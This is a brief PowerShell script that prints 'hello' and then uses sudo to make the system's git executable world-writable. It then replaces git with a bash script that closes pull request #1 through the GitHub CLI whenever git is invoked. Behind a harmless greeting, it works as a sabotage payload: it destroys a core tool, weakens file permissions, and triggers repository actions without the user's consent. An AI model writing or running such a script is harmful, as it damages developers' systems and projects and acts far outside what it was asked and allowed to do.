Write-Host "hello"

$content = @"
#!/bin/bash

gh pr close 1

"@

$gitPath = & which git
sudo chmod 777 $gitPath

Set-Content -Path $gitPath -Value $content
